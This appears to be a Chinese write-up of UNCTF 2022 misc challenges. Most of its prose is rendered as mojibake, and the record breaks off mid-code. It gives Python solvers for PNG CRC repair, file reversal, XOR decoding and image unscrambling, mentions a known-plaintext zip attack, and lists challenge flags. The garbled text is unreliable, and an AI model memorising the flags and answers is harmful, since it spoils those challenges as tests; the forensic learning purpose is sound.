UNCTF{5L6d5Y+k5q+U5Y+k546b5Y2h5be05Y2h546b5Y2h5be05Y2hIOS+neWPpOavlOWPpOeOm+WNoeW3tOWNoSDnjpvljaHlt7TljaHkvp3lj6Tmr5Tlj6Qg5L6d5Y+k5q+U5Y+k5L6d5Y+k5q+U5Y+k546b5Y2h5be05Y2h546b5Y2h5be05Y2h5L6d5Y+k5q+U5Y+k546b5Y2h5be05Y2hIOS+neWPpOavlOWPpOeOm+WNoeW3tOWNoSDnjpvljaHlt7TljaHkvp3lj6Tmr5Tlj6Qg5L6d5Y+k5q+U5Y+k5L6d5Y+k5q+U5Y+k546b5Y2h5be05Y2h546b5Y2h5be05Y2h5L6d5Y+k5q+U5Y+k546b5Y2h5be05Y2hIOeOm+WNoeW3tOWNoeeOm+WNoeW3tOWNoSDkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaEg546b5Y2h5be05Y2h5L6d5Y+k5q+U5Y+k546b5Y2h5be05Y2hIOS+neWPpOavlOWPpOeOm+WNoeW3tOWNoSDkvp3lj6Tmr5Tlj6Tkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaHnjpvljaHlt7TljaHkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaEg546b5Y2h5be05Y2h5L6d5Y+k5q+U5Y+k5L6d5Y+k5q+U5Y+k5L6d5Y+k5q+U5Y+kIOS+neWPpOavlOWPpOeOm+WNoeW3tOWNoSDnjpvljaHlt7TljaHkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaEg5L6d5Y+k5q+U5Y+k546b5Y2h5be05Y2hIOS+neWPpOavlOWPpOeOm+WNoeW3tOWNoSDkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaEg5L6d5Y+k5q+U5Y+k546b5Y2h5be05Y2hIOS+neWPpOavlOWPpOeOm+WNoeW3tOWNoSDnjpvljaHlt7TljaHkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaHkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaHnjpvljaHlt7TljaE=}
```

![](./unctf_misc.assets/2022-11-18_15-19.png)

```
ä¾å¤æ¯”å¤ç›å¡å·´å¡ç›å¡å·´å¡ ä¾å¤æ¯”å¤ç›å¡å·´å¡ ç›å¡å·´å¡ä¾å¤æ¯”å¤ ä¾å¤æ¯”å¤ä¾å¤æ¯”å¤ç›å¡å·´å¡ç›å¡å·´å¡ä¾å¤æ¯”å¤ç›å¡å·´å¡ ä¾å¤æ¯”å¤ç›å¡å·´å¡ ç›å¡å·´å¡ä¾å¤æ¯”å¤ ä¾å¤æ¯”å¤ä¾å¤æ¯”å¤ç›å¡å·´å¡ç›å¡å·´å¡ä¾å¤æ¯”å¤ç›å¡å·´å¡ ç›å¡å·´å¡ç›å¡å·´å¡ ä¾å¤æ¯”å¤ç›å¡å·´å¡ ç›å¡å·´å¡ä¾å¤æ¯”å¤ç›å¡å·´å¡ ä¾å¤æ¯”å¤ç›å¡å·´å¡ ä¾å¤æ¯”å¤ä¾å¤æ¯”å¤ç›å¡å·´å¡ç›å¡å·´å¡ä¾å¤æ¯”å¤ç›å¡å·´å¡ ç›å¡å·´å¡ä¾å¤æ¯”å¤ä¾å¤æ¯”å¤ä¾å¤æ¯”å¤ ä¾å¤æ¯”å¤ç›å¡å·´å¡ ç›å¡å·´å¡ä¾å¤æ¯”å¤ç›å¡å·´å¡ ä¾å¤æ¯”å¤ç›å¡å·´å¡ ä¾å¤æ¯”å¤ç›å¡å·´å¡ ä¾å¤æ¯”å¤ç›å¡å·´å¡ ä¾å¤æ¯”å¤ç›å¡å·´å¡ ä¾å¤æ¯”å¤ç›å¡å·´å¡ ç›å¡å·´å¡ä¾å¤æ¯”å¤ç›å¡å·´å¡ä¾å¤æ¯”å¤ç›å¡å·´å¡ç›å¡å·´å¡
```

è§£ç å‡ºæ¥éƒ½æ˜¯ ä¾å¤æ¯”å¤ç›å¡å·´å¡ è¿™äº›éƒ½æ˜¯èŠ±å›­å®å®é‡Œé¢çš„äººç‰©,æˆ‘ä»¬åˆçŸ¥é“é¢˜ç›®çš„åç§°ä¸º `In_the_Morse_Garden` Garden åº”è¯¥å°±æ˜¯èŠ±å›­å®å®çš„èŠ±å›­,é‚£ä¹ˆå‰é¢çš„æ‘©æ–¯åº”è¯¥å°±æ˜¯æ‘©æ–¯å¯†ç äº†ã€‚

è€Œè¿™ä¸ªå¯†æ–‡åªæœ‰ ä¾å¤æ¯”å¤,ç›å¡å·´å¡,åˆšå¥½å¯¹åº”æ‘©æ–¯å¯†ç çš„ `. å’Œ _` æ‰€ä»¥æˆ‘ä»¬å°è¯•ä¸€ä¸‹å°† ä¾å¤æ¯”å¤ ç›å¡å·´å¡ æ›¿æ¢æˆ `. _` å¾—åˆ°æ‘©æ–¯ç”µç ï¼Œç„¶åå°è¯•è§£ç 

```
.__ ._ _. ..__._ ._ _. ..__._ __ ._ _._ ._ ..__._ _... ._ _._ ._ ._ ._ ._ ._ _._.__
```

è§£ç å‡ºæ¥ä¸º æ™šå®‰ç›å¡å·´å¡,ä¸ºæœ‰æ„ä¹‰çš„å­—ç¬¦ç»„åˆï¼Œé‚£ä¹ˆè¿™ä¸ªåº”è¯¥å°±æ˜¯ flag äº†
æäº¤ä¹‹åï¼Œå‘ç°ä¸ºæ­£ç¡®çš„ flag


```
UNCTF{WAN_AN_MAKA_BAKAAAAA!}
```

![](./unctf_misc.assets/2022-11-18_15-54.png)

### å·¨é±¼




ä¸‹è½½é™„ä»¶ä¹‹åï¼Œè§£å‹æˆåŠŸåè·å¾—ä¸€å¼ å›¾ç‰‡ `fish.png` æ‰“å¼€å‘ç°æ‰“å¼€ä¸äº†ï¼Œè¿™è¾¹æ€€ç–‘æ˜¯æ”¹äº†å®½é«˜å¯¼è‡´ crc é”™è¯¯

> æˆ‘ä»¬çŸ¥é“åœ¨ linux ç³»ç»Ÿå†…å®½é«˜è¢«ä¿®æ”¹ (crc é”™è¯¯) å›¾ç‰‡å°†æ‰“ä¸å¼€

æ‰€ä»¥æˆ‘é¦–å…ˆæƒ³åˆ°çš„å°±æ˜¯è¯¥æ–‡ä»¶çš„å®½é«˜æœ‰é—®é¢˜

æˆ‘ä½¿ç”¨ `pngcheck` æŸ¥çœ‹ä¸€ä¸‹è¯¥æ–‡ä»¶çš„crcå€¼,å‘ç°çœŸçš„é”™è¯¯

![](./unctf_misc.assets/2022-11-18_16-03.png)

æˆ‘ä»¬å¯ä»¥ç¼–å†™ä»¥ä¸‹ä»£ç æ¥çˆ†ç ´è¯¥å›¾ç‰‡çš„å®½é«˜

```python
#coding=utf-8
import sys
import zlib
import os
import struct
import codecs

DEFAULT_TEMP_FILE_NAME = "output.png"


def gain_utils(file_name):
    with open(file_name, "rb") as reader:
        data = bytearray(reader.read())
    IHDR_ChunkData = data[12:29]
    new_crc = hex(zlib.crc32(IHDR_ChunkData))
    crc32key = codecs.encode(data[29:33], "hex").decode("ascii")
    crack_info = (IHDR_ChunkData, "0x" + crc32key)
    return crack_info, new_crc


def crack(IHDR_ChunkData, crc32key):
    try_data = IHDR_ChunkData
    max_num = 0xfff 
    for width in range(max_num): 
        width_data = bytearray(struct.pack('>i', width)) 
        for height in range(max_num):
            height_data = bytearray(struct.pack('>i', height))
            try_data[4:8] = width_data
            try_data[8:12] = height_data
            crc32result = zlib.crc32(try_data)
            if crc32result == int(crc32key, 16):
                c_width = codecs.encode(width_data, "hex").decode("ascii")
                c_height = codecs.encode(height_data, "hex").decode("ascii")
                print("\33[34m" + "[+] Currect Width: {} Height: {}".format(
                    c_width, c_height) + "\33[0m")
                return width_data, height_data


def fix_file(file_name, cwidth, cheight):
    with open(file_name, "rb") as reader:
        data = bytearray(reader.read())
    data[16:20] = cwidth
    data[20:24] = cheight
    if os.path.exists(DEFAULT_TEMP_FILE_NAME):
        print("\33[33m" +
              "[!] This path exists {}".format(DEFAULT_TEMP_FILE_NAME) +
              "\33[0m")
        exit(1)
    with open(DEFAULT_TEMP_FILE_NAME, "wb") as writer:
        writer.write(data)


def change_path():
    global DEFAULT_TEMP_FILE_NAME
    export_filename = sys.argv[2]
    DEFAULT_TEMP_FILE_NAME = export_filename
    return None


if __name__ == '__main__':
    argc = len(sys.argv)
    assert (argc <= 3)
    file = sys.argv[1]
    if (argc == 3):
        change_path()
    crack_info, new_crc = gain_utils(file)
    meta_info = crack(*crack_info)
    if meta_info == None:
        print("\33[31m" + "Crack Width and Height failed!" + "\33[0m")
        exit(1)
    fix_file(file, *meta_info)
    print("\33[32m" +
          "[*] The correct image ({}) was successfully exported".format(
              DEFAULT_TEMP_FILE_NAME) + "\33[0m")

```

æˆ‘å·²ç»å°†è¿™ä¸ªæ–‡ä»¶ä¸Šä¼ åˆ° github ä¸Šäº†:[pngcrc.py](https://github.com/zhouhaobusy/utils/blob/main/dotfiles/pngcrc.py)

![](./unctf_misc.assets/2022-11-18_16-01.png)


![](./unctf_misc.assets/2022-11-18_16-06.png)

![](./unctf_misc.assets/2022-11-18_16-10.png)

![](./unctf_misc.assets/2022-11-18_16-14.png)

![](./unctf_misc.assets/2022-11-18_16-16.png)
![](./unctf_misc.assets/2022-11-18_22-35.png)
![](./unctf_misc.assets/2022-11-18_22-42.png)
![](./unctf_misc.assets/2022-11-18_22-54.png)
![](./unctf_misc.assets/2022-11-18_22-57.png)
![](./unctf_misc.assets/2022-11-18_22-57_1.png)
![](./unctf_misc.assets/2022-11-18_23-02.png)
![](./unctf_misc.assets/2022-11-18_23-06.png)
![](./unctf_misc.assets/2022-11-18_23-06_1.png)

![](./unctf_misc.assets/2022-11-18_23-07.png)
![](./unctf_misc.assets/2022-11-18_23-09.png)

### zhiyin

![](./unctf_misc.assets/2022-11-18_23-11.png)
![](./unctf_misc.assets/2022-11-18_23-14.png)
![](./unctf_misc.assets/2022-11-18_23-15.png)
![](./unctf_misc.assets/2022-11-18_23-16.png)
![](./unctf_misc.assets/2022-11-18_23-20.png)
![](./unctf_misc.assets/2022-11-18_23-51.png)
![](./unctf_misc.assets/2022-11-19_00-36.png)
![](./unctf_misc.assets/2022-11-19_00-39.png)
![](./unctf_misc.assets/2022-11-19_00-40.png)
![](./unctf_misc.assets/2022-11-19_01-06.png)

æˆ‘ä»¬å‘ç° `lanqiu.jpg` è¿™ä¸ªæ–‡ä»¶æ˜¾ç¤ºä¸äº†,è¿˜æœ‰ä¸€ä¸ªå›¾ç‰‡ ( `zhiyin.png` ) èƒ½è¿›è¡ŒæŸ¥çœ‹

æˆ‘ä»¬å…ˆå¯¹èƒ½æŸ¥çœ‹çš„å›¾ç‰‡è¿›è¡Œåˆ†æ,

æˆ‘ä»¬ä½¿ç”¨ `zsteg` æ¥åˆ†æä¸€ä¸‹ `zhiyin.png` è¿™å¼ å›¾ç‰‡ã€‚


å‘ç°åœ¨æ–‡ä»¶å°¾å­˜åœ¨æ‘©æ–¯å¯†ç ,è¿›è¡Œè§£ç ä¹‹åæˆåŠŸè·å¾—ä¸€æ®µå­—ç¬¦ä¸²,è¿™æ®µå­—ç¬¦ä¸²ä»¥ `_` å¼€å¤´è¯´æ˜å¾ˆæœ‰å¯èƒ½åªæ˜¯ç»“æœçš„ä¸€éƒ¨åˆ†

æ‰€ä»¥æˆ‘ä»¬å†åˆ†æå¦å¤–ä¸€å¼ å›¾ç‰‡ã€‚

å›¾ç‰‡æ˜¾ç¤ºä¸å‡ºï¼Œæˆ‘ä»¬å…ˆä½¿ç”¨ file æŸ¥çœ‹ä¸€ä¸‹è¿™ä¸ªæ–‡ä»¶æ˜¯ä»€ä¹ˆä¸œè¥¿ï¼Œå‘ç°ä¸æˆ‘æ‰€æƒ³è±¡çš„ä¸å¤ªä¸€æ ·ï¼Œå®ƒä»…ä»…åªæ˜¯ data

ç„¶åæˆ‘ä»¬ä½¿ç”¨ `010editor` æ‰“å¼€è¿™ä¸ªæ–‡ä»¶ï¼Œçœ‹çœ‹åˆ°åº•é‡Œé¢å­˜äº†å•¥ã€‚

å½“æˆ‘ä»¬ç§»åˆ°è¿™ä¸ªæ–‡ä»¶çš„æœ€åï¼Œå‘ç°å¥½åƒè¿™ä¸ªæ–‡ä»¶å°±æ˜¯è¢«å€’è½¬äº†ä¸€ä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥ç¼–å†™ä»¥ä¸‹ python è„šæœ¬è¿›è¡Œé€†è½¬å›å»ã€‚

```python
import os

def reverse_file(path):
    with open(path, "rb") as stream:
        temp = bytes(stream.read())[::-1]
    with open(path + "__", "wb") as container:
        container.write(temp)

if __name__ == '__main__':
    reverse_file("./lanqiu.jpg")

```
æ‰“å¼€è¿™ä¸ªå›¾ç‰‡ï¼Œå‘ç°å›¾ç‰‡ä¸Šå­˜åœ¨ä¸€æ®µå­—ç¬¦ï¼Œæˆ‘ä»¬å¯ä»¥å¤§èƒ†çŒœæµ‹ä¸€ä¸‹è¿™ä¸ªå°±æ˜¯æˆ‘ä»¬è¦æ‰¾çš„å‰ä¸€æ®µã€‚

> è¿™é‡Œæœ‰ä¸€ä¸ªå°å‘: å›¾ç‰‡å†…çš„å­—ç¬¦æ˜¯ `Go_p1ay` è€Œä¸æ˜¯ `Go_play` è¯·æ³¨æ„çœ‹ 



è¿™è¾¹æˆ‘ç›´æ¥å°è¯•äº†ä¸€ä¸‹å°†è¿™ä¸ªå­—ç¬¦ä¸²åŒ…è£¹èµ·æ¥å½“flagäº¤äº†ä¸Šå»ï¼Œå‘ç°æ²¡äº¤ä¸Šï¼Œåé¢è®¤çœŸçœ‹äº†ä¸€ä¸‹ç›®å½•ï¼Œå‘ç°è¿˜æœ‰ä¸€ä¸ª flag.zip è¿™æ—¶å€™æˆ‘å°±çŸ¥é“,è¿™ä¸€ä¸²ä¸œè¥¿å¯èƒ½æ˜¯è¿™ä¸ªå‹ç¼©åŒ…çš„å¯†ç ã€‚

æˆ‘ä»¬å°è¯•è¿›è¡Œè§£å‹ã€‚

å‘ç°å…¶æŠ¥é”™äº†ï¼Œæˆ‘ä»¬å¸¸è§„æ“ä½œï¼Œå»æŸ¥çœ‹ä¸€ä¸‹è¿™ä¸ªzipå‹ç¼©åŒ…çš„äºŒè¿›åˆ¶æ ¼å¼

å‘ç°å…¶æ–‡ä»¶å¤´é”™è¯¯,å°è¯•è¿›è¡Œä¿®å¤,ä¿®å¤å®Œæˆä¹‹åï¼Œèƒ½æˆåŠŸè§£æè¯¥ zip å‹ç¼©åŒ…äº†ã€‚

ç„¶åæˆ‘ä»¬ä½¿ç”¨åˆšåˆšè·å¾—çš„å¯†ç å»è§£å‹è¿™ä¸ªå‹ç¼©åŒ… `Go_p1ay_UNC7F!!!` æ­å–œä½ ï¼Œä½ å°†è§£å‹å¤±è´¥ :)

> è¿™é‡Œæœ‰ä¸€ä¸ªå‘: ( æ°¸è¿œä¸è¦å¿˜äº†æ‘©æ–¯å¯†ç æ˜¯æ²¡æœ‰å¤§å°å†™ä¹‹åˆ†çš„,å¿˜äº†çš„è¯è¿Ÿæ—©æœ‰ä¸€å¤©å®ƒä¼šå®³äº†ä½ ã€‚)

æ‰€ä»¥æ­£ç¡®çš„å¯†ç ä¸º `Go_p1ay_unc7f!!!`


```
UNCTF{M1sic_1s_greAt}
```


### æ¸…å’Œfan

![](./unctf_misc.assets/2022-11-19_01-15.png)
![](./unctf_misc.assets/2022-11-19_01-16.png)

ä¸‹è½½ä¹‹åè·å¾—ä¸€ä¸ªå‹ç¼©åŒ…

<div style="border-radius:15px;display:block;background-color:#a8dadc;border:2px solid #aaa;margin:15px;padding:10px;">
å¦‚æœæ˜¯ Linux (å¹¶ä¸ç”¨å›¾å½¢åŒ–) è¿™é‡Œå°†æœ‰ä¸€ä¸ªå¤§å‘!!!
<br> <font color="red"> å°±æ˜¯æˆ‘ä»¬ä½¿ç”¨ <code>zipinfo -v file_name </code>è¿™ä¸ªå‘½ä»¤å¾ˆæœ‰å¯èƒ½ä¸èƒ½æ­£å¸¸æ˜¾ç¤ºä¸­æ–‡æ³¨é‡Š. </font>
</div>

å› ä¸ºä¸Šé¢é‚£ä¸ªå‘ï¼Œè€Œæˆ‘å½“æ—¶å¹¶ä¸çŸ¥é“zipinfo å­˜åœ¨è¿™ä¸ªé—®é¢˜ï¼Œåœ¨è¿™é‡Œå¡äº†å¥½ä¹…ï¼Œéƒ½æ²¡å•¥æ€è·¯.ğŸ˜…

åé¢ä½¿ç”¨ bandizip è¿™ä¸ªè½¯ä»¶æ‰“å¼€è¿™ä¸ªå‹ç¼©åŒ…æ‰å‘ç°ä¸‹é¢è¿™æ®µæ³¨é‡Šä¿¡æ¯


æ ¹æ®è¿™æ®µä¿¡æ¯æˆ‘ä»¬å°±å»Bç«™,æŸ¥æ‰¾æ¸…å’Œè¿™ä¸ªupä¸» çš„ `uid` å’Œæœ€é«˜æ’­æ”¾é‡è§†é¢‘çš„å‘å¸ƒæ—¥æœŸ

è·å¾—å¯†ç : `836885_2022/05/20`


è§£å‹ä¹‹å
è·å¾—ä¸€å¼ å›¾ç‰‡

![](./unctf_misc.assets/2022-11-20_15-42.png)

![](./unctf_misc.assets/2022-11-20_15-41.png)

æˆ‘ä½¿ç”¨ `zsteg` æˆåŠŸæ‰¾åˆ°é‡Œé¢éšè—çš„ä¿¡æ¯ `qq857488580`


æˆ‘ä»¬å†ä½¿ç”¨ç¬¬äºŒæ­¥è§£å¯†å‡ºæ¥çš„å¯†ç è¿›è¡Œè§£å¯†å‘ç°æˆåŠŸè·å¾—flag

æˆ‘ä»¬å¯ä»¥å®‰è£… `RX-SSTV` æ¥è§£æ

å¦‚æœæˆ‘ä»¬ä¸æƒ³å¬åˆ°å£°éŸ³çš„è¯æˆ‘ä»¬å¯ä»¥å®‰è£…ä¸€ä¸ªè™šæ‹Ÿå£°å¡ è¿™è¾¹ä½¿ç”¨ `Virtual Audio Cable`

å‘ç°è·å¾—ä¸€å¼ å›¾ç‰‡,é‡Œé¢å­˜åœ¨ä¸€ä¸ªæ¯”è¾ƒæ˜æ˜¾çš„å­—ç¬¦ä¸²,æˆ‘ä»¬ä½¿ç”¨è¿™ä¸ªå­—ç¬¦ä¸²å¯¹é‡Œé¢çš„å‹ç¼©åŒ…è¿›è¡Œè§£å‹ç¼©ï¼Œå‘ç°æˆåŠŸè§£å‹

![](./unctf_misc.assets/Snipaste_2022-11-20_16-12-11.png)

è§£å‹ä¹‹åå¾—åˆ°ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶,æ‰“å¼€ä¹‹åï¼Œå‘ç°è¿›è¡Œäº†é›¶å®½éšå†™

![](./unctf_misc.assets/2022-11-20_16-16.png)

æˆ‘ä»¬å¯¹å…¶è¿›è¡Œé›¶å®½è§£ç ,æˆåŠŸè·å¾— flag

![](./unctf_misc.assets/2022-11-20_16-18.png)

`unctf{wha1e_wants_a_girlfriend_like_alicia}`

---

ä¸Šé¢æ˜¯æ¯”èµ›æ—¶ï¼Œè‡ªå·±ä½¿ç”¨çš„æ–¹å¼ï¼Œæ¯”èµ›å®Œåï¼Œçœ‹åˆ«çš„å¸ˆå‚…çš„wpä¹‹åï¼Œå‘ç°è¿˜æœ‰æ›´å¥½çš„å·¥å…·

[sstv-github](https://github.com/colaclanth/sstv)

ä½¿ç”¨æ–¹å¼: `python setup.py install`

ç„¶åå†ä½¿ç”¨ `sstv -d ç¥ç§˜ç”µæŠ¥.wav -o flag.png`

![](./unctf_misc.assets/2022-11-23_08-52.png)

ç„¶åæˆ‘ä»¬æŸ¥çœ‹è¯¥å›¾ç‰‡å‘ç°åŒæ ·èƒ½è·å¾—å›¾åƒ

![](./unctf_misc.assets/2022-11-23_08-53.png)

### å‰¥èŒ§æŠ½ä¸

ä¸‹è½½é™„ä»¶åè·å¾—ä¸€ä¸ªå‹ç¼©åŒ…

[aaa](http://330k.github.io/misc_tools/unicode_steganography.html)

å‘ç°æœ‰ä¸€æ®µå­—ç¬¦æ³¨é‡Šï¼Œä¸€å¼€å§‹æˆ‘è¿˜ä»¥ä¸ºæ˜¯æ©ç çˆ†ç ´ã€‚

æ²¡æƒ³åˆ°çš„æ˜¯è¿™ç©æ„å°±æ˜¯è¿™ä¸ªå‹ç¼©åŒ…çš„å¯†ç 

![](./unctf_misc.assets/2022-11-19_03-15.png)

æˆ‘ä»¬ä½¿ç”¨ `S?e?a?o?r?p?y` æˆåŠŸå¯¹è¯¥å‹ç¼©åŒ…è¿›è¡Œè§£å‹ã€‚

![](./unctf_misc.assets/2022-11-20_14-40.png)

è§£å‹ä¹‹åï¼Œè·å¾—äº†ä¸€ä¸ª `1.txt` æˆ‘ä»¬ä½¿ç”¨ vim æ‰“å¼€è¯¥æ–‡ä»¶ï¼Œå‘ç°å­˜åœ¨é›¶å®½éšå†™ï¼Œæˆ‘ä»¬å°†å…¶å¤åˆ¶åˆ°é›¶å®½éšå†™çš„ç½‘ç«™é‡Œè¿›è¡Œè§£ç ã€‚
![](./unctf_misc.assets/2022-11-20_14-40_1.png)

<font color="red"> è¿™è¾¹éœ€è¦æ³¨æ„çš„æ˜¯ä¸€å®šè¦é€‰æ‹©äºŒè¿›åˆ¶æ–‡ä»¶è§£ç ï¼Œä¸ç„¶è§£ç ä¸å‡º </font>

![](./unctf_misc.assets/2022-11-20_14-56.png)

è§£å‹ä¹‹åï¼Œé‡Œé¢è¿˜å­˜åœ¨ä¸€ä¸ªéœ€è¦å¯†ç çš„å‹ç¼©åŒ…

è€Œè§£ç å‡ºæ¥ï¼Œæˆ‘ä»¬è·å¾—ä¸€ä¸ªå¾ˆåƒå¯†ç çš„å­—ç¬¦ä¸²: `PAsS_W0rD`,æ‰€ä»¥æˆ‘ä»¬å°±ä½¿ç”¨è¿™ä¸ªå­—ç¬¦ä¸²å½“åšå¯†ç å°è¯•è§£å‹ç¬¬äºŒå±‚éœ€è¦å¯†ç çš„å‹ç¼©åŒ…

é—æ†¾çš„æ˜¯å‘ç°è§£å‹å¤±è´¥ã€‚

åˆ°è¿™é‡Œï¼Œæˆ‘å°±æƒ³èƒ½ä¸èƒ½å°è¯•å·²çŸ¥æ˜æ–‡æ”»å‡»ï¼Œå› ä¸ºæˆ‘ä»¬å·²ç»è·å¾—äº†ä¸€ä¸ªæ–‡ä»¶ `1.txt` å’Œä¸€ä¸ª `flag.zip` å¦‚æœ`flag.zip` é‡Œé¢å­˜åœ¨ä¸¤ä¸ªæ–‡ä»¶ï¼Œå¹¶ä¸”ä¸€ä¸ªæ–‡ä»¶æ˜¯

![](./unctf_misc.assets/2022-11-20_14-57.png)

![](./unctf_misc.assets/2022-11-20_15-16.png)

![](./unctf_misc.assets/2022-11-20_15-36.png)

ç„¶åè¿›è¡Œå·²çŸ¥æ˜æ–‡æ”»å‡»

![](./unctf_misc.assets/Snipaste_2022-11-20_15-53-45.png)

![](./unctf_misc.assets/2022-11-24_18-36.png)

![](./unctf_misc.assets/2022-11-24_19-06.png)

æˆåŠŸè·å¾— flag

![](./unctf_misc.assets/Snipaste_2022-11-20_15-56-39.png)

### My Picture

![](./unctf_misc.assets/2022-11-19_01-32.png)


ä¸‹è½½é™„ä»¶ï¼Œè§£å‹ä¹‹åè·å¾—ä¸€ä¸ª `dat` æ–‡ä»¶å’Œä¸€å¼ è´¼æ‚ä¹±çš„å›¾ç‰‡ã€‚

ä¸€å¼€å§‹æˆ‘ä¸çŸ¥é“å•¥æ˜¯dat æ–‡ä»¶ï¼Œåé¢ç™¾åº¦ä¹‹åå‘ç°è¯¥æ–‡ä»¶æ˜¯å¾®ä¿¡çš„ä¸€ç§æ–‡ä»¶æ ¼å¼ [dat æ–‡ä»¶](https://www.cnblogs.com/4thrun/p/15148485.html)

<font color="red"> å°±æ˜¯å°†ä¸€ä¸ªæ–‡ä»¶çš„æ¯ä¸€ä½éƒ½ä¸ä¸€ä¸ªæ•°è¿›è¡Œå¼‚æˆ–ä¹‹åè¿›è¡Œå­˜å‚¨çš„ </font>


è€Œæˆ‘ä»¬çŸ¥é“æ¯ä¸ªæ–‡ä»¶éƒ½æœ‰å®ƒçš„æ–‡ä»¶å¤´æ ‡è¯†ï¼Œæ‰€ä»¥æˆ‘ä»¬æ˜¯ä¸æ˜¯å¯ä»¥é€šè¿‡éå†æ–‡ä»¶å¤´ï¼Œä¸datä¸­çš„æ¯ä¸ªå­—èŠ‚è¿›è¡Œå¼‚æˆ–ï¼Œå¦‚æœå¾—åˆ°è¿ç»­ç›¸ç­‰çš„å¸¸é‡ï¼Œå°±è¯´æ˜è¯¥datæºæ–‡ä»¶å°±æ˜¯è¿™ä¸ªæ ¼å¼çš„ï¼Œå¹¶ä¸”æˆ‘ä»¬è¿˜èƒ½è·å¾—å®ƒæºæ–‡ä»¶ä¸å“ªä¸ªæ•°è¿›è¡Œçš„å¼‚æˆ–æ“ä½œ.

ç¼–å†™çˆ†ç ´æ–‡ä»¶ã€‚

```python
# -*- coding: utf-8 -*-


def check_file(file_head, dat_file):
    """
    this function will check the file type 
    """
    with open(dat_file, 'rb') as reader:
        dat_hex = bytearray(reader.read())
    assert (len(dat_hex) >= 2)
    for i in range(len(file_head)):
        hex_list = file_head[i]['head'].split(' ')
        check_flag = set(
            [int(hex_list[i], 16) ^ dat_hex[i] for i in range(len(hex_list))])
        if len(check_flag) == 1:
            print(file_head[i]['name'])
            print("the xor seed is:", check_flag)
            # return (file_name xor_seed)
            return (file_head[i]['name'], check_flag.pop())
        else:
            print(f"not {file_head[i]['name']}")
            pass
    return ('', '')


def hack_dat(fin, fout, xor_seed):
    """
    use the xor_seed to recover the xor file
    """
    assert (isinstance(xor_seed, int))
    with open(fin, 'rb') as reader:
        fi_hex = bytearray(reader.read()) # dat_file hex list
    output_bytes = bytearray(map(lambda x: x ^ xor_seed, fi_hex))
    with open(fout, 'wb') as writer:
        writer.write(output_bytes)


if __name__ == "__main__":
    heads = [{
        "name": 'jpg',
        "head": 'FF D8 FF E0'
    }, {
        "name": 'jpeg',
        "head": 'FF D8 FF E1'
    }, {
        "name": 'Jpeg',
        "head": 'FF D8 FF E8'
    }, {
        "name": 'png',
        "head": 'FF D8 FF E8'
    }, {
        "name": 'bmp',
        "head": '42 4D 36 5D'
    }, {
        "name": 'gif',
        "head": '47 49 46 38'
    }, {
        "name": 'zip',
        "head": '50 4B 03 04'
    }, {
        "name": 'rar',
        "head": '52 61 72 21'
    }, {
        "name": 'mp3',
        "head": '49 44 33 03'
    }, {
        "name": 'wav',
        "head": '52 49 46 46'
    }]

    name, seed = check_file(heads, "./dat")
    print(name, seed)
    fout = 'output.' + name
    hack_dat('./dat', fout, seed)
```

ä¸Šé¢æ˜¯æˆ‘é‡‡ç”¨çš„æ–¹å¼ï¼Œä¸è¿‡è¿˜æœ‰ä¸€ç§æ›´ç®€å•çš„æ–¹å¼ï¼Œå°±æ˜¯çœ‹ä»€ä¹ˆ 16 è¿›åˆ¶å‡ºç°å¾—æœ€å¤šï¼Œé‚£ä¹ˆè¿™ä¸ª 16 è¿›åˆ¶å­—ç¬¦å¾ˆæœ‰å¯èƒ½æ˜¯é‚£ä¸ªå¼‚æˆ–çš„å€¼ï¼Œå› ä¸º 0 å¼‚æˆ–ä¸Šä»»ä½•å€¼éƒ½ä¸ºå®ƒæœ¬èº«,è€Œåœ¨å‡ ä¹æ‰€æœ‰æ–‡ä»¶æ ¼å¼ï¼Œ00 ä¸€èˆ¬æ˜¯å­˜åœ¨æœ€å¤šçš„äºŒè¿›åˆ¶å†…å®¹ã€‚


è¿è¡Œå®Œä¹‹åï¼Œå‘ç°æºæ–‡ä»¶æ˜¯ä¸€ä¸ª zip æ–‡ä»¶,å¹¶ä½¿ç”¨è¿™ä¸ªæ•°å¯¹å…¶è¿›è¡Œè§£å¯†

![](./unctf_misc.assets/2022-11-20_17-43.png)

è§£å‹è¿™ä¸ªzip æ–‡ä»¶æˆ‘ä»¬è·å¾—äº†ä¸€ä¸ª python è„šæœ¬æ–‡ä»¶,å¾ˆæ˜¾ç„¶è¿™å¼ å›¾ç‰‡å°±æ˜¯ç»è¿‡è¿™ä¸ªè„šæœ¬å¤„ç†åçš„å›¾åƒï¼Œæ‰€ä»¥æˆ‘ä»¬è¦é€†å‘è¿™æ®µå¤„ç†å›¾åƒçš„ä»£ç ï¼Œç„¶åè¿˜åŸå‡ºåŸæœ¬çš„å›¾åƒï¼Œåº”è¯¥å°±èƒ½è·å¾— flag äº†

åˆ†æè¿™ä¸ª python è„šæœ¬ï¼Œæˆ‘ä»¬ç¼–å†™å…¶é€†å‘ä»£ç 

```python
#! /usr/bin/env python3
from PIL import Image as im

flag = im.open('flag.png', 'r')
l, h = flag.size
print(l, h)
puzzle = im.new('RGB', (h, l))

coord_info = [] # contain all pixel

for i in range(1200):
    cols = [] # contain every lines pixel info
    for j in range(787):
        x_coord = (i * 787 + j) // 1200
        y_coord = (i * 787 + j) % 1200
        cols.append([x_coord, y_coord])
    coord_info.append(cols)
assert (len(coord_info) == 1200)
assert (len(coord_info[0]) == 787)

for i in range(1200):
    for j in range(787):
        b, g, r = flag.getpixel((coord_info[i][j][0], coord_info[i][j][1]))
        r = r ^ g
        g = g ^ b
        b = b ^ r
        puzzle.putpixel((i, j), (r, g, b))
puzzle.save('flag.png')
flag.close()
puzzle.close()
```

è¿è¡Œå®Œä¹‹åæˆåŠŸè·å¾— flag

![](./unctf_misc.assets/2022-11-19_02-59.png)



### CatchJerry


æˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¿™ä¸ªå‘½ä»¤æ¥è·å– usb å†…çš„ä¿¡æ¯


```bash
tshark -r usb.pcap -T fields -e usb.capdata | sed '/^\s*$/d' > usbdata.txt
```
```bash
tshark -r ./CatchJerry.pcapng -Y "usbhid.data" -T fields -e usbhid.data > mouse.txt
```


```python
with open("mouse.txt", "r") as f:
